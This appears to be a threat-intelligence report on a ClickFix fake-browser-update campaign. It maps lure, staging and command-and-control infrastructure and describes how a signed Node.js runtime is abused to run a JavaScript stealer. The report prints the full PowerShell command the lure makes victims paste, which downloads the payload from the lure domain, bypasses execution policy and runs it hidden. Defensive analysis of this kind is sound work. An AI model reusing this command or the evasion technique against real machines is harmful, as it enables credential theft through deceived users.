campaign: ClickFix Social Engineering & Node.js Ingress Campaign

mitre_attack.name: User Execution: Malicious Link / Social Engineering

rich_intel.gti_description: Active ClickFix / ClearFake lure infrastructure. Presents fake browser update prompts that instruct the user to execute obfuscated PowerShell snippets via Win+R. The script downloads a legitimate Node.js portable runtime from nodejs.org to execute an unpacked malicious JavaScript payload while communicating with command-and-control servers.
rich_intel.triage_summary: High risk social engineering attack chain. Employs ClickFix browser injection to launch hidden PowerShell commands, abuses official nodejs.org distribution channels to introduce an unmanaged execution runtime, and connects to C2 infrastructure.

details.role: Initial Victim Browser navigating to malicious lure

details.invoked_via: User Run dialog (Win+R) via ClickFix social engineering

details.role: Dual-Use Delivery: Official Node.js binary abused to execute unpacked JS payload

malware_specialist.summary: Static analysis and sandbox execution confirmed a living-off-the-land ingress attack. The ClickFix lure coaxes the victim into pasting an obfuscated PowerShell execution string via the Windows Run dialog (Win+R) that bypasses execution policies (-EP Bypass -WindowStyle Hidden). The script abuses official Node.js distribution infrastructure at nodejs.org to download a clean, signed portable runtime disguised as msedge.zip, which is extracted into C:\ProgramData\ to execute an obfuscated JavaScript stealer (Update.js) without triggering conventional untrusted PE compilation alerts.
key_findings: ClickFix social engineering lure prompts manual Win+R execution of obfuscated PowerShell string.
Dual-use ingress: Abuses official OpenJS Foundation infrastructure (nodejs.org) to retrieve authentic signed node.exe.
Masquerading: Disguises downloaded portable Node.js runtime archive as msedge.zip and chrome.zip in C:\ProgramData\.
Payload extraction: Unpacks Update.zip to write obfuscated stealer script Update.js.
Defense evasion: Leverages living-off-the-land execution by running node.exe Update.js in a hidden window.

mitre_attack.name: User Execution: Malicious Link / Social Engineering

malware_specialist.markdown_report:
#### 1. Initial Vector & Social Engineering (ClickFix)
The intrusion begins with victim browsing in `firefox.exe`, resolving malicious lure domain `autoupdatet.com`. The lure presents a high-urgency modal claiming browser components failed to load, prompting the victim to press `Win+R` and paste a clipboard command string.

#### 2. Obfuscated PowerShell LOLBin Execution
The victim executes `powershell.exe` with flags `-NoProfile -EP Bypass -WindowStyle Hidden`. The script initiates concurrent downloads:
```powershell
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -EP Bypass -WindowStyle Hidden -Command Invoke-WebRequest -Uri 'https://autoupdatet.com/get_update?i=112640' -OutFile 'Update.zip' -UseBasicParsing -TimeoutSec 300;Invoke-WebRequest -Uri 'https://nodejs.org/dist/v7.10.1/node-v7.10.1-win-x64.zip' -OutFile 'msedge.zip' -UseBasicParsing -TimeoutSec 300;Expand-Archive 'msedge.zip' -DestinationPath 'C:\ProgramData\' -Force; Expand-Archive 'Update.zip' -DestinationPath 'C:\ProgramData\' -Force; Start-Process 'C:\ProgramData\node-v7.10.1-win-x64\node.exe' -ArgumentList 'C:\ProgramData\Update.js' -WindowStyle Hidden;
```

#### 3. Dual-Use Binary Living-off-the-Land
Rather than compiling an untrusted PE executable that would trigger endpoint detection and response (EDR) heuristics, the script downloads a clean, signed binary directly from official infrastructure at **`https://nodejs.org/dist/v7.10.1/node-v7.10.1-win-x64.zip`** and executes an unpacked JavaScript payload (`Update.js`).

infrastructure_specialist.summary: Passive DNS, WHOIS correlation, and network telemetry reveal a distributed staging and traffic distribution network. autoupdatet.com was registered via NiceNIC International Group Ltd and configured as a ClickFix fake-update lure. Direct payload delivery is hosted on 194.213.18.130:443 (AS49870), with secondary fallback staging via updatemsnow.com. Traffic Distribution System (TDS) and C2 routing is handled via waysmakeyourlifebetter.com connecting via Microsoft Edge.
key_findings: Delivery Lure: autoupdatet.com serves deceptive browser update modals.
Staging Server: 194.213.18.130 (Port 443, AS49870) hosts malicious Update.zip payloads.
Secondary Stager: updatemsnow.com provides fallback payload distribution.
C2 / TDS Proxy: waysmakeyourlifebetter.com handles post-infection command callbacks.
Abused External Dependency: nodejs.org (OpenJS Foundation) utilized as dual-use delivery conduit.
infrastructure_specialist.markdown_report:
#### 1. Lure & Staging Infrastructure Mapping
- **Primary Lure**: `autoupdatet.com`
  - Registrar: NiceNIC International Group Ltd
  - Active role: ClickFix fake browser update modal
- **Payload Host**: `194.213.18.130` (TCP Port 443)
  - ASN: AS49870
  - Active role: Direct hosting of `Update.zip` and `get_update?i=112640`

#### 2. Secondary Staging & C2 / TDS Routing
- **Secondary Domain**: `updatemsnow.com`
  - Active role: Fallback stager serving `get_update?i=229280`
- **C2 / TDS Callback**: `waysmakeyourlifebetter.com`
  - Connection vector: Microsoft Edge outbound beaconing
